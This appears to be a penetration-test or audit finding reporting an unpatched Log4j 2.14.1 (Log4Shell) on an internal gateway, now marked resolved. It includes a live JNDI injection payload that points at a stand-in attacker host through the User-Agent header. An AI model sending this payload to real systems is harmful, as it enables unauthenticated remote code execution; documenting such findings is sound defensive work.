---
title: Unpatched Log4j (CVE-2021-44228)
severity: Critical
asset: Orion Gateway
date: 2025/04/14
location: https://gw.orion.corp/api/log
status: Resolved
---

The logging service uses Apache Log4j 2.14.1, which is vulnerable to
Log4Shell (CVE-2021-44228). Sending `${jndi:ldap://attacker.com/x}` in
the `User-Agent` header triggers an outbound LDAP connection, confirming
remote code execution is achievable.

**Impact:** Full remote code execution on the application server with
no authentication required.
